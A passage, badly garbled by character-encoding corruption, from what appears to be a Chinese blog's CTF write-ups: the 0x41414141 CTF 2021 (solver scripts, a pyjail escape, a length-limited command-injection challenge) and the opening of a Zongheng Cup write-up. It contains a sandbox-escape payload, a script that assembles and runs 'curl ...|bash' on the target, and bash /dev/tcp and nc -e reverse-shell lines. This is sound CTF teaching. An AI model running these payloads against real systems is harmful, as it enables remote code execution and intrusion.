çš„é¢˜ç›®ï¼ˆæ€ä¹ˆè¿™ä¹ˆå–œæ¬¢å‡º å‘½ä»¤æ³¨å…¥çªç ´é•¿åº¦é™åˆ¶ | ä»CTFé¢˜ç›®è®²èµ· References &amp; Extensive ReadingæŒ–æ´ç»éªŒ | å‘½ä»¤æ³¨å…¥çªç ´é•¿åº¦é™åˆ¶ ä»ä¸€é“ctfé¢˜ç›®å­¦åˆ°çš„ç»•è¿‡é•¿åº¦æ‰§è¡Œå‘½ä»¤å§¿åŠ¿ CTFä¸­çš„å‘½ä»¤æ‰§è¡Œç»•è¿‡ ï¼ˆæºœäº†å–µ","path":"2021/01/31/CTF_web_CommandExecutionLimitedLength/"},{"title":"CTF | 2021 0x41414141CTF éƒ¨åˆ† WriteUp","text":"å–µå–µï¼Œæœ€è¿‘ CTF æ¯”è¾ƒå¤šï¼Œæ‘¸é±¼èµ·æ¥æ¯”è¾ƒå¿™ï¼Œä»¥è‡³äºå¥½å‡ ç¯‡åšå®¢éƒ½å’•äº†ã€‚ å™¢æˆ‘æ•°æ•°ï¼Œä¸€ç¯‡ä¸¤ç¯‡ï¼Œä¸å¯¹ï¼Œå·²ç»åœ¨è·¯ä¸Šäº† 2333ã€‚ è¿™ç¯‡å±…ç„¶å°±æˆäº† 2021 å¹´çš„æ–°å¹´ç¬¬ä¸€ç¯‡ï¼Œé‚£å…ˆ ç¥å¤§å®¶æ–°å¹´å¿«ä¹å–µ~ ï¼ˆè™½ç„¶æ™šäº†ç‚¹ï¼Œé—®é¢˜ä¸å¤§ å¼•è¨€ è¿™åº”è¯¥æ˜¯ç¬¬ä¸€æ¬¡æ¥çœ‹å›½å¤–çš„ CTF æ¯”èµ›å”‰ã€‚ èµ·å› å…¶å®æ˜¯æœ‰å¸ˆå‚…æ¥é—®æˆ‘è¿™ä¸ªæ¯”èµ›æ€ä¹ˆæ³¨å†Œï¼Œå‡†ç¡®åœ°è¯´æ˜¯æ‰¾ä¸åˆ°æ³¨å†Œç”¨çš„ PIN code åœ¨å“ªï¼ˆ ç„¶åæˆ‘å°±é¡ºä¾¿æ¥çœ‹çœ‹é¢˜äº† 233. å½“ç„¶ä¸»è¦è¿˜æ˜¯çœ‹äº† Misc é¢˜å§ã€‚ ä»‹ç»é¡µé¢ï¼š https://ctf.offshift.io/ å¹³å°ç½‘å€ï¼š https://ctfd.offshift.io/ Discordï¼š https://discord.com/invite/heKqkmWpbk è¿™ä¸ªæ¯”èµ›æŒç»­äº†ä¸€å‘¨ï¼Œä» 20210124T0000 UTC+8 å¼€å§‹ï¼Œä¸€ç›´åˆ° 20210131T0000 UTC+8. Secret Pin Codeè¿˜å¡æ³¨å†Œï¼Œå¤ªåäº†ï¼ About é‡Œå‘Šè¯‰æˆ‘ä»¬ The secret pin code for CTF entry is hidden somewhere on this site äºæ˜¯å·¨å¤šäººåœ¨ discord é‡Œé—®ä¸»åŠæ–¹è¿™ä¸ªåœ¨å“ªé‡Œã€‚ æ ¹æ®ä¸»åŠæ–¹å‡ æ¡ä¸åŒçš„å›å¤ï¼Œæ„æ€æ˜¯å°±åœ¨ https://ctfd.offshift.io/ è¿™ä¸ª domain ä¸‹ï¼ŒHTML æºç é‡Œæ²¡æœ‰ã€‚ ç„¶åæˆ‘å’Œå…¶ä»–å¸ˆå‚…ä¸€èµ·æ‰¾äº†ä¸€æ™šä¸Šã€‚ã€‚ web é¢˜ç›®å¸¸è§çš„åœ°æ–¹éƒ½æ‰¾äº†ï¼ŒJS æºç ã€HTTP2 Server Push éƒ½å»çœ‹äº†ï¼Œéƒ½æ²¡å‘ç°ã€‚ åæ¥æƒ³æ˜¯ä¸æ˜¯ gif éšå†™å•Šï¼Œå…ˆæ˜¯çœ‹äº† Top Logoï¼Œå°±ä»–é¦–é¡µå¤§å›¾ï¼Œæˆ–è€…è¿™ç¯‡æ–‡ç« ä¸€å¼€å§‹çš„é‚£å¼ å›¾ã€‚å‘ç°å¹¶æ²¡æœ‰ã€‚ å†åæ¥ï¼Œæ˜¯ä¸æ˜¯ç½‘ç«™å·¦ä¸Šè§’è¿™ä¸ª logo å•Šã€‚ ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™å¼ å›¾ã€‚ ç„¶åå‘ç°æ–‡ä»¶æœ€ç»“å°¾éšå†™äº†ã€‚ è‰æ­»äº†ã€‚ secret: 100100100101 PIN ä¸€èˆ¬æ˜¯4-6ä½ï¼Œäºæ˜¯è½¬åè¿›åˆ¶ï¼Œå³ 2341. ç„¶åæ³¨å†Œå°±å¥½äº†ã€‚ MiscOptimizer EU instance: 207.180.200.166 9660 US instance: 45.134.3.200 9660 Level 1tower of hanoi æ±‰è¯ºå¡”ï¼Œå¥½å”‰ã€‚ è¯•äº†ä¸€ä¸‹ï¼Œä»–è¿™ä¸ª list çš„é•¿åº¦å°±æ˜¯æœ€åˆå§‹çš„åœ†ç›˜æ•°é‡ã€‚ æ‰¾äº†ä¸ªæ±‰è¯ºå¡”çš„é€’å½’å®ç°ã€‚ def move(n, a, b, c): # nä¸ºåœ†ç›˜æ•°ï¼Œaä»£è¡¨åˆå§‹ä½åœ†æŸ±ï¼Œbä»£è¡¨è¿‡æ¸¡ä½åœ†æŸ±ï¼Œcä»£è¡¨ç›®æ ‡ä½åœ†æŸ± if n == 1: print(a, '--&gt;', c) else: # å°†åˆå§‹ä½çš„n-1ä¸ªåœ†ç›˜ç§»åŠ¨åˆ°è¿‡æ¸¡ä½ï¼Œæ­¤æ—¶åˆå§‹ä½ä¸ºaï¼Œä¸Šä¸€çº§å‡½æ•°çš„è¿‡æ¸¡ä½bå³ä¸ºæœ¬çº§çš„ç›®æ ‡ä½ï¼Œä¸Šçº§çš„ç›®æ ‡ä½cä¸ºæœ¬çº§çš„è¿‡æ¸¡ä½ move(n-1, a, c, b) print(a, '--&gt;', c) # å°†è¿‡æ¸¡ä½çš„n-1ä¸ªåœ†ç›˜ç§»åŠ¨åˆ°ç›®æ ‡ä½ï¼Œæ­¤æ—¶åˆå§‹ä½ä¸ºbï¼Œä¸Šä¸€çº§å‡½æ•°çš„ç›®æ ‡ä½cå³ä¸ºæœ¬çº§çš„ç›®æ ‡ä½ï¼Œä¸Šçº§çš„åˆå§‹ä½aä¸ºæœ¬çº§çš„è¿‡æ¸¡ä½ move(n-1, b, a, c) ä½†æ˜¯è¿™é‡Œå¹¶ä¸éœ€è¦æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹ï¼Œåªç”¨å…³å¿ƒç§»åŠ¨çš„æ¬¡æ•°å³å¯ã€‚ å¯ä»¥å‘ç°é€’æ¨å…¬å¼æ˜¯ $ f(n)=2*f(n-1)+1 $ äºæ˜¯ payload ###### level 1 ####### def solve(n, cnt=0): if n == 1: cnt += 1 return cnt cnt = solve(n-1, cnt) cnt = 2 * cnt + 1 return cnt sh = remote('45.134.3.200', 9660) # sh = remote('207.180.200.166', 9660) # level 1: tower of hanoi print('+++++++++ Level 1 ++++++++\\n') sh.recvuntil('level 1: tower of hanoi\\n') cnt = 0 while True: r = sh.recvuntil('\\n').decode().strip() if 'level' in r: break data = re.search(r'(\\[.+\\])', r).group(1) x = eval(data) print(x) length = len(x) print('-----&gt;', length) num = solve(length) print('=====&gt;', num) sh.recvuntil('&gt; ') sh.sendline(str(num)) cnt += 1 print('~~~', cnt, '~~~') # 25 å‘ç° 25æ¬¡äº¤äº’ä¹‹åå°±åˆ°äº†ç¬¬äºŒå…³ã€‚ Level 2merge sort, give me the count of inversions ä»–çš„æ„æ€æ˜¯ï¼Œå¯¹ç»™å®šçš„æ•°ç»„åšå½’å¹¶æ’åºï¼Œç»™å‡ºé€†åºæ•°ã€‚ ï¼ˆè¯´å®è¯åˆšå¼€å§‹æ²¡çœ‹æ‡‚è¿™ä¸ªå•¥æ„æ€ inversion é€†åºæ•°Definition: å¯¹æ•°ç»„a[], å­˜åœ¨ä¸€å¯¹ (i, j) æœ‰i &lt; j ä¸” a[i] &gt; a[j] å³ä¸ºä¸€ä¸ªé€†åºæ•°å¯¹ e.g. {1,3,5,2,4,6} é€†åºæ•°ä¸º3 i.e. (3,2) (5,2) (5,4) mergesort çš„å¤§è‡´æ€è·¯ï¼Œå°±æ˜¯å°†ä¸€ä¸ªæ•°ç»„å¹³å‡åˆ†æˆå·¦å³ä¸¤ä¸ªå­æ•°ç»„ï¼Œåˆ†åˆ«è°ƒç”¨æ’åºå‡½æ•°æœ¬èº«ï¼Œè¿”å›çš„æ˜¯ä¸¤ä¸ªå·²æ’åºçš„æ•°ç»„ï¼Œç„¶åå†å°†å…¶ merge èµ·æ¥ã€‚æ—¶é—´å¤æ‚åº¦æ˜¯ O(nÂ·log n)ã€‚ å‚è€ƒ å¹¶å½’æ’åºå’Œé€†åºæ•°è®¡ç®— Merge Sort and Counting Inversions å¹¶å½’æ’åº(Merge Sort)æ˜¯ä¸€ç§ä½¿ç”¨åˆ†æ²»æ³•(Divided-and-Conquer)æ€è·¯è®¾è®¡çš„æ’åºç®—æ³• å¹¶å½’æ’åºçš„è¿‡ç¨‹ï¼š Divide å°†nä¸ªå…ƒç´ åˆ†æˆä¸¤ä¸ªåŒ…å«n/2ä¸ªå…ƒç´ çš„çš„å­åºåˆ—Conquer ç”¨å¹¶å½’æ’åºå¯¹ä¸¤ä¸ªå­åºåˆ—è¿›è¡Œæ’åºMerge å°†ä¸¤ä¸ªå·²æ’åºçš„å­åºåˆ—åˆå¹¶å¾—åˆ°ç»“æœ C++ å®ç°ï¼š #include &lt;iostream&gt; #include &lt;fstream&gt; using namespace std; const int MAXN = 1e7 + 10; int A[MAXN]; int T[MAXN]; int Merge(int a, int mid, int b) { int count = 0; int i = a; //iä¸ºç¬¬ä¸€ä¸ªåºåˆ—çš„ç´¢å¼• int j = mid + 1; //jä¸ºç¬¬ä¸€ä¸ªåºåˆ—çš„ç´¢å¼• int k = a; //kä¸ºåˆå¹¶ååºåˆ—çš„ç´¢å¼• while (i &lt;= mid &amp;&amp; j &lt;= b) { if (A[i] &lt;= A[j]) { T[k++] = A[i++]; } else { if (A[i] &gt;= A[j]) { T[k++] = A[j++]; count += j - k; //ç§»åŠ¨ä¸€ä¸ªå…ƒç´ åæ¶ˆé™¤çš„é€†åºæ•° } } } //æ­¤æ—¶ä¸¤ä¸ªå­åºåˆ—å·²ç»æœ‰ä¸€ä¸ªå®Œå…¨è¢«åˆå¹¶ æŠŠå¦ä¸€ä¸ªåºåˆ—çš„å‰©ä½™å…ƒç´ åˆå¹¶ while (i &lt;= mid) { T[k++] = A[i++]; } while (j &lt;= b) { T[k++] = A[j++]; } //å°†åˆå¹¶åçš„æ•°ç»„å¤åˆ¶åˆ°åŸæ•°ç»„ for (int i = a; i &lt;= b; i++) { A[i] = T[i]; } return count; //è¿”å›æ­¤æ¬¡åˆå¹¶çš„é€†åºæ•° } int MergeSort(int a, int b) { if (a &lt; b) //åˆ¤å®šåºåˆ—é•¿åº¦æ˜¯å¦å¤§äº1ï¼Œä¸åˆ¤å®šä¼šé€ æˆæ— é™å¾ªç¯ { int count = 0; int mid = (a + b) / 2; count += MergeSort(a, mid); count += MergeSort(mid + 1, b); count += Merge(a, mid, b); return count; } return 0; } int main() { fstream file(\"./input.txt\", ios::in); if (!file) printf(\"exception!\"); int i = 0; unsigned int count = 0; char s[10]; while (file &gt;&gt; s) { A[i++] = atoi(s); } cout &lt;&lt; i &lt;&lt; endl; count = MergeSort(0, i - 1); printf(\"%u\\n\", count); return 0; } ä¸ºäº†æ–¹ä¾¿ï¼Œç§»æ¤åˆ°äº† Python ä¸Šè¿›è¡Œäº¤äº’ã€‚ ###### level 2 ####### A = [0]*10000 T = [0]*10000 def Merge(a, mid, b): count = 0 i = a j = mid + 1 k = a while i &lt;= mid and j &lt;= b: if A[i] &lt;= A[j]: T[k] = A[i] i += 1 k += 1 else: if A[i] &gt;= A[j]: T[k] = A[j] j += 1 k += 1 count += j - k # ç§»åŠ¨ä¸€ä¸ªå…ƒç´ åæ¶ˆé™¤çš„é€†åºæ•° # æ­¤æ—¶ä¸¤ä¸ªå­åºåˆ—å·²ç»æœ‰ä¸€ä¸ªå®Œå…¨è¢«åˆå¹¶ æŠŠå¦ä¸€ä¸ªåºåˆ—çš„å‰©ä½™å…ƒç´ åˆå¹¶ while i &lt;= mid: T[k] = A[i] i += 1 k += 1 while j &lt;= b: T[k] = A[j] j += 1 k += 1 # å°†åˆå¹¶åçš„æ•°ç»„å¤åˆ¶åˆ°åŸæ•°ç»„ A[a:b+1] = T[a:b+1] return count # è¿”å›æ­¤æ¬¡åˆå¹¶çš„é€†åºæ•° # level 2 : merge sort, give me the count of inversions print('+++++++++ Level 2 ++++++++\\n') cnt = 0 while True: r = sh.recvuntil('\\n').decode().strip() if 'level' in r: break data = re.search(r'(\\[.+\\])', r).group(1) x = eval(data) print('-----&gt;', x) length = len(x) A = [0]*10000 T = [0]*10000 A[:length] = x num = MergeSort(0, length - 1) print('=====&gt;', num) sh.recvuntil('&gt; ') sh.sendline(str(num)) cnt += 1 print('~~~', cnt, '~~~') # 25 # b\"you won here's your flag flag{g077a_0pt1m1ze_3m_@ll}\\n\" 25æ¬¡äº¤äº’ä¹‹åæ‹¿åˆ° flagã€‚ flag{g077a_0pt1m1ze_3m_@ll} 0x414141 I think offshift promised to opensource some of their code é‚£å°±å» GitHub ä¸Šæœ offshift å¥½äº†ï¼Œäºæ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªä»“åº“ã€‚ å‘ç°åˆ é™¤äº†ä¸€ä¸ª script.cpython-38.pycï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹å§ã€‚ åœ¨çº¿é‚£ä¸ªåç¼–è¯‘ä¸å¤§æˆåŠŸï¼Œå¹²è„†ç›´æ¥æœ¬åœ°åç¼–è¯‘ä¸€ä¸‹ã€‚ uncompyle6 -o scripy.py script.cpython-38.pyc å¾—åˆ° import base64 secret = 'https://google.com' cipher2 = [b'NDE=', b'NTM=', b'NTM=', b'NDk=', b'NTA=', b'MTIz', b'MTEw', b'MTEw', b'MzI=', b'NTE=', b'MzQ=', b'NDE=', b'NDA=', b'NTU=', b'MzY=', b'MTEx', b'NDA=', b'NTA=', b'MTEw', b'NDY=', b'MTI=', b'NDU=', b'MTE2', b'MTIw'] cipher1 = [base64.b64encode(str(ord(i) ^ 65).encode()) for i in secret] æŠŠ cipher1 æ‰“å°å‡ºæ¥ï¼Œå‘ç°ä¸å¯¹ã€‚ [b'NDE=', b'NTM=', b'NTM=', b'NDk=', b'NTA=', b'MTIz', b'MTEw', b'MTEw', b'Mzg=', b'NDY=', b'NDY=', b'Mzg=', b'NDU=', b'MzY=', b'MTEx', b'MzQ=', b'NDY=', b'NDQ='] ç„¶åæƒ³åˆ°æŒ‰ç…§ cipher1 çš„é€»è¾‘é€†å‘å›å»è§£ cipher2 l = [chr(int(base64.b64decode(i)) ^ 65) for i in cipher2] s = ''.join(l) print(s) # https://archive.is/oMl59 è®¿é—®è¿™ä¸ª archive ç½‘ç«™ã€‚ å‘ç°äº†ä¸€ä¸ª PDF æ–‡ä»¶ super secret random file https://mega.nz/file/AAdDyIoB#gpj5s9N9-VnbNhSdkJ24Yyq3BWSYimoxanP-p03gQWs smashing.pdf å‘ç°å‰å‡ ä½å’Œ 65 å¼‚æˆ–ä¸€ä¸‹ï¼Œæ­£å¥½å°±æ˜¯ %PDFï¼Œå°±æ˜¯ PDF çš„æ–‡ä»¶å¤´ï¼Œäºæ˜¯å†™ä¸ªè„šæœ¬å¤„ç†ä¸€ä¸‹ã€‚ ï¼ˆå‹æƒ…æé†’ï¼Œè¿™é‡Œæœ‰å‘ï¼Œå¯ä»¥è·³è¿‡è¿™å‡ æ®µï¼‰ with open('./smashing.pdf', 'rb') as fin: content = fin.read() print(content) s = '' for i in content: s += chr(i ^ 65) with open('./smashing_fix.pdf', 'wb') as fout: fout.write(s.encode()) å¾—åˆ°çš„æ–‡ä»¶ï¼Œå‘ç°æ‰“å¼€ä¸€ç‰‡ç©ºç™½ã€‚ å†çœ‹ hexï¼Œåœ¨æ–‡ä»¶ç»“å°¾å‘ç°äº†ç†Ÿæ‚‰çš„å‹ç¼©åŒ…ã€‚ è€Œä¸”å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸ª flag.txt æå–å‡ºæ¥ï¼Œå‘ç°æ–‡ä»¶æŸåï¼Œæ‰“ä¸å¼€ã€‚æ¯”å¯¹äº†ä¸€ä¸‹æ­£å¸¸çš„å‹ç¼©åŒ…ï¼Œè¿™æ”¹çš„ä¹Ÿå¤ªå¤šäº†å§ã€‚ å•Šå•Šå•Šå•Šå•Šï¼Œä¸ºä»€ä¹ˆå•Šï¼Œä¸å¯¹åŠ²ï¼ çªç„¶ï¼Œå‘ç°æ–‡ä»¶å¤§å°æ€ä¹ˆä¸ä¸€æ ·ï¼Œä¿å­˜å‡ºæ¥çš„æ–‡ä»¶å¤§äº†è®¸å¤šã€‚ å†å›å»çœ‹ python è„šæœ¬ï¼Œåœ¨è¿›è¡Œ s.encode() ä¹‹åé•¿åº¦å˜å¤§äº†ã€‚çœ‹æ¥ç¼–ç è¿™é‡Œé¢æœ‰é—®é¢˜ã€‚ å¾—æŒ‰ç…§ byte æ¥é€ä½å¼‚æˆ–æ‰è¡Œã€‚ äºæ˜¯é‡å†™äº†ä¸€ä¸‹è„šæœ¬ã€‚ with open('./smashing.pdf', 'rb') as fin: content = fin.read() print(content) parts = [] for i in content: parts.append(bytes([i ^ 65])) x = b''.join(parts) print(len(x)) with open('./smashing_fix.pdf', 'wb') as fout: fout.write(x) æˆ–è€…ï¼Œç”¨ bytearray # Or parts = bytearray() for i in content: parts.append(i ^ 65) with open('./smashing_fix1.pdf', 'wb') as fout: fout.write(parts) å¥½å‘å•Šï¼ å†æ‰“å¼€æ¥çœ‹ï¼Œè¿™å°±å¯¹äº†å˜›ï¼Bitcoin è®²ç©¶ã€‚ zip æš´åŠ›ç ´è§£ä¸€ä¸‹å¯†ç ï¼Œä¸º passwdã€‚ è§£å‹å¾—åˆ° flag flag{1t_b33n_A_l0ng_w@y8742} å–µå‘œï¼Œè€å¥—å¨ƒäº†ï¼ pyjail Escape me plz. EU instance: 207.180.200.166 1024 US instance: 45.134.3.200 1024 æºç å¦‚ä¸‹ã€‚ #!/usr/bin/env python3 import re from sys import modules, version banned = \"import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data\" search_func = lambda word: re.compile(r\"\\b({0})\\b\".format(word), flags=re.IGNORECASE).search modules.clear() del modules def main(): print(f\"{version}\\n\") print(\"What would you like to say?\") for _ in range(10): text = input('&gt;&gt;&gt; ').lower() check = search_func(banned)(''.join(text.split(\"__\"))) if check: print(f\"Nope, we ain't letting you use {check.group(0)}!\") break if re.match(\"^(_?[A-Za-z0-9])*[A-Za-z](_?[A-Za-z0-9])*$\", text): print(\"You aren't getting through that easily, come on.\") break else: exec(text, {'globals': globals(), '__builtins__': {}}, {'print':print}) if __name__ == \"__main__\": main() å™«ï¼Œæ˜¯ Python æ²™ç®± å•Šï¼å°±å’Œ SSTI å·®ä¸å¤šå•¦ã€‚ æ˜¯ç»•ç»•ç»•å¥½äº†ï¼Œè¿™é¢˜å’Œå¹³å¸¸çš„æ²™ç®±é€ƒé€¸è¿˜æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå°±æ˜¯ä»–é™åˆ¶äº†æ‰§è¡Œçš„ globals å’Œ localsï¼Œè¿˜æŠŠ sys.modules éƒ½åˆ äº†ã€‚ å…ˆåœ¨æœ¬åœ°è¯•ç€è·‘ä¸€ä¸‹ï¼ŒæŠŠè¿‡æ»¤çš„éƒ¨åˆ†éƒ½æ³¨é‡Šæ‰ã€‚ æ¥çœ‹çœ‹ globals é‡Œæœ‰å•¥å‘¢ã€‚ å¯ä»¥å‘ç°ï¼Œè™½ç„¶å…¨å±€çš„ __builtins__ ä¹ˆå¾—äº†ï¼Œä½†åœ¨ globals å†…éƒ¨è¿˜æ˜¯å­˜åœ¨ __builtins__ çš„ï¼Œå¥½è€¶ï¼ é‚£æˆ‘ä»¬å°±ç›´æ¥ç”¨è¿™ä¸ªå¥½äº†ï¼ ä½†æ˜¯ getattr, reload è¿™ç±»å†…ç½®å‡½æ•°éƒ½ä¹ˆå¾—äº†ï¼Œå¦‚æœåœ¨ç”¨åˆ°çš„æ¨¡å—å†…éƒ¨éœ€è¦ __import__ çš„è¯ä¹Ÿç”¨ä¸æ¥ã€‚ è¯•äº†ä¸€æ®µæ—¶é—´ï¼Œå‘ç°ä¸‹é¢è¿™ä¸ªå¯è¡Œã€‚ print(globals['__builtins__'].__import__('os').system('dir')) ä¸‹é¢çœ‹çœ‹ å¦‚ä½•ç»•è¿‡è¿‡æ»¤ã€‚ å¾ˆæ˜æ˜¾å­—ç¬¦ä¸²çš„è¯æœ€ç®€å•ç›´æ¥å°±æ‹¼æ¥å¥½äº†ï¼Œå¯¹äºè°ƒç”¨å±æ€§/æ–¹æ³•çš„è¯ï¼Œå¯ä»¥ç”¨ xx.__dict__[å‡½æ•°å](å‚æ•°) çš„æ–¹å¼æ¥æ‰§è¡Œã€‚ ï¼ˆç¬¬äºŒæ­¥è¿‡æ»¤å¥½åƒä¹Ÿæ²¡å•¥ç”¨çš„äºšå­ äºæ˜¯ payloadï¼š print(globals['__builtins__'].__dict__['__imp''ort__']('o''s').__dict__['sy''stem']('ls /')) print(globals['__builtins__'].__dict__['__imp''ort__']('o''s').__dict__['sy''stem']('cat /flag.txt')) æ‰“è¿œç¨‹ï¼Œå¾—åˆ° flag Extensive reading: ä¸€æ–‡çœ‹æ‡‚Pythonæ²™ç®±é€ƒé€¸ Pythonæ²™ç®±é€ƒé€¸çš„nç§å§¿åŠ¿ pythonæ²™ç›’é€ƒé€¸ Webhackme can you please just hack me, I will execute all your commands but only 4 chars in length EU instance US instance è®¿é—®å¾—åˆ° use arg cmd for running a command and arg ?reset for clearing the env åªå…è®¸4ä¸ªå­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œï¼Œå””ï¼ŒæŒºç†Ÿæ‚‰çš„é¢˜ç›®ï¼Œç”šè‡³æœ‰åŸé¢˜ã€‚ æ¯”å¦‚ HITCON 2017 CTF BabyFirst Revengeï¼Œè¿™ä¸ªç½‘ä¸Šå·¨å¤š WriteUpã€‚ è¿™ä¸ª server æ˜¯ gunicorn/19.7.1ï¼Œåº”è¯¥æ˜¯ python èµ·çš„å§ã€‚ å…ˆæ¥çœ‹çœ‹ å½“å‰ç›®å½•ä»¥åŠç›®å½•ä¸‹æœ‰å•¥ã€‚ # curl \"http://207.180.200.166:8000/?cmd=pwd\" /home/ctf/code/sandbox/22229031 # curl \"http://207.180.200.166:8000/?cmd=pwd\" # curl \"http://207.180.200.166:8000/?cmd=ls%20/\" bin dev etc flag.txt home lib media mnt proc root run sbin srv sys tmp usr var å¯è§åœ¨æ²™ç®±é‡Œï¼Œå½“å‰ç›®å½•ä¸‹ä¹ˆå¾—ä¸œè¥¿ï¼Œflag åœ¨æ ¹ç›®å½•ä¸‹ã€‚ é‚£ä¹ˆå°±éœ€è¦æ‰§è¡Œ cat /flag.txtï¼Œæˆ–è€…ç®€ç•¥ä¸€ç‚¹ï¼Œcat /f*. ç„¶è€Œï¼Œä¸èƒ½ç”Ÿæˆå¸¦æœ‰ / çš„æ–‡ä»¶åï¼Œè¿˜æ˜¯å¾—ä»¥å‘½ä»¤çš„å½¢å¼æ¥æ‰§è¡Œã€‚ ä½†æ˜¯æœ‰ä¸ª trickï¼Œç”¨ * å¯ä»¥å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•åŠæ–‡ä»¶åï¼Œè€Œä¸”èƒ½ç”¨æ–‡ä»¶åæ‰§è¡Œå‘½ä»¤ã€‚ å½“ç„¶è¿™ä¸ªæ˜¯æ’åºæ˜¯æŒ‰ç…§å­—æ¯é¡ºåºæ¥çš„ï¼Œç©ºæ ¼=&gt;æ•°å­—=&gt;å­—æ¯ã€‚ äºæ˜¯å…ˆç”Ÿæˆä¸€ä¸ª åä¸º cat çš„æ–‡ä»¶ï¼Œç„¶åå†ç”¨ *+å‚æ•° å°±èƒ½æ‰§è¡Œå‘½ä»¤äº†ã€‚ Payloadï¼š # curl \"http://207.180.200.166:8000/?cmd=&gt;cat\" # curl \"http://207.180.200.166:8000/?cmd=*%20/f*\" flag{ju57_g0tt@_5pl1t_Em3012} å°±èƒ½å¾—åˆ° flag äº†~ flag{ju57_g0tt@_5pl1t_Em3012} å…¶å®æœ¬æ¥æ˜¯æƒ³ åå¼¹ shell çš„ï¼Œæœ¬åœ°æ‰“é€šäº†ï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥è¿œç¨‹å¼¹ä¸å‡ºæ¥ï¼ˆå¯èƒ½ä¸é€šå¤–ç½‘ï¼Ÿ emmm VPS ä¸Šèµ·ä¸€ä¸ª web æœåŠ¡ï¼Œå†…å®¹ä¸º bash -i &gt;&amp; /dev/tcp/VPSIP/PORT 0&gt;&amp;1 # æˆ–è€… nc -e /bin/sh VPSIP PORT payload: # coding: utf-8 import requests from urllib.parse import quote baseurl = \"http://207.180.200.166:8000/?cmd=\" reset = \"http://207.180.200.166:8000/?reset\" # baseurl = \"http://45.134.3.200:8000/?cmd=\" # reset = \"http://45.134.3.200:8000/?reset\" s = requests.session() s.get(reset) # æ–‡ä»¶ x å†…å®¹ä¸º ls -th &gt; g list1 = [ \"&gt;sl\", \"&gt;ht-\", \"&gt;g\\&gt;\", \"&gt;dir\", \"*&gt;v\", \"&gt;rev\", \"*v&gt;x\" ] # curl VPSIP:PORT|bash list2 = [ \"&gt;bash\", \"&gt;\\|\\\\\", \"&gt;11\\\\\", \"&gt;11\\\\\", \"&gt;1:\\\\\", \"&gt;11\\\\\", \"&gt;1.\\\\\", \"&gt;11\\\\\", \"&gt;11.\\\\\", \"&gt;11.\\\\\", \"&gt;\\ \\\\\", \"&gt;rl\\\\\", \"&gt;cu\\\\\" ] for i in list1: url = baseurl + quote(str(i)) print(\"sending\", quote(i)) r = s.get(url) print('==&gt;', r.text) for j in list2: url = baseurl + quote(str(j)) print(\"sending\", quote(j)) r = s.get(url) print('==&gt;', r.text) print('ls -t') r = s.get(baseurl+quote(\"ls -t\")) r.encoding = 'utf-8' print('==&gt;', r.text) print('sh x') r = s.get(baseurl+quote(\"sh x\")) r.encoding = 'utf-8' print('==&gt;', r.text) print('sh g') r = s.get(baseurl+quote(\"sh g\")) r.encoding = 'utf-8' print('==&gt;', r.text) s.get(reset) BTW, è¿˜æœ‰å…¶ä»–çš„ trickï¼Œæ¥æ€»ç»“äº†ä¸€ä¸‹ï¼Œæ”¾åˆ°ä¸‹é¢è¿™ç¯‡åšå®¢é‡Œäº†ã€‚ CTF | é™åˆ¶é•¿åº¦ä¸‹çš„å‘½ä»¤æ‰§è¡Œ æŠ€å·§æ±‡æ€» References &amp; Extensive reading: HITCON 2017 CTF BabyFirst Revenge è¿™ä¸ªç”¨ tar å¾—åˆ°æ ¹ç›®å½•ä¸‹æ–‡ä»¶ï¼Œä¸è¿‡å‰ææ˜¯å½“å‰ç›®å½•æ–‡ä»¶èƒ½ä¸‹è½½ï¼Œphp å€’æ˜¯å¯ä»¥ã€‚ Baby First Revenge v2 etc. å°ç»“è¿˜æŒºå¥½ç©çš„ï¼ŒMisc é¢˜ åªæœ‰ä¸‰é¢˜å˜¤å˜¤å˜¤ï¼Œå™¢ç»“æŸäº†æ‰å‘ç°åˆä¸Šäº†ä¸¤é¢˜æ–°é¢˜ï¼Œæ²¡äº‹äº†ã€‚ è·¨å¹´çº¢åŒ…å‡†å¤‡å‡ºäº†ï¼ˆå’•å’•å’• ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/01/31/CTF_2021_0x41414141/"},{"title":"CTF | 2020 çºµæ¨ªæ¯ Misc&Web WriteUp","text":"å¼•è¨€å‘œï¼Œè½¬çœ¼å°±åˆ° 2020 å¹´æœ«äº†ï¼Œäº‹æƒ…æœ‰ç‚¹æ‚æœ‰ç‚¹å°å¤šï¼Œå‘ç°æœ‰ä¸å°‘æƒ³åšçš„äº‹æƒ…å’•æ‰äº†ï¼Œç­‰åé¢å¹´ç»ˆæ€»ç»“å†è¯´å§ï¼ˆå¯èƒ½è¿™ä¸ªä¹Ÿå’•äº†å‘¢ 233. å‰å‡ å¤©å¤©å¤©æœ‰æ¯”èµ›ï¼Œåä¸º XCTF ä¸‰åœºé¡¶ä¸ä½ï¼Œè¿˜æœ‰ DASCTF x BJDCTF4thï¼Œä¸è¿‡æœŸæœ«äº†é˜Ÿé‡Œæ²¡å¸ˆå‚…æ‰“ä¹Ÿæ²¡æ€ä¹ˆçœ‹ã€‚ ä¸è¿‡å‘¨æœ«å’Œé˜Ÿå‹ä¸€èµ·æ‰“äº†ä¸ªçºµæ¨ªæ¯ï¼Œé¢˜ç›®è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ã€‚ å¹³å°åœ°å€ï¼š https://www.ichunqiu.com/2020zonghenghttps://race.ichunqiu.com/2020zongheng è¿™é‡Œå†™å†™å‡ é“é¢˜ç›®çš„ WriteUp å§ã€‚ ï¼ˆçœ‹äº†å¤§ä½¬ä»¬çš„ WPï¼Œé¡ºä¾¿å¤ç°äº†å‡ é¢˜ Miscç­¾åˆ° [0146, 0154, 0141, 0147, 0173, 0167, 063, 0154, 0143, 0157, 0155, 0145, 0137, 0164, 0157, 0137, 062, 0157, 0156, 0147, 0137, 0150, 063, 0156, 0147, 0137, 0142, 0145, 061, 0175] å…«è¿›åˆ¶è½¬å­—ç¬¦ä¸² flags = [146, 154, 141, 147, 173, 167, 63, 154, 143, 157, 155, 145, 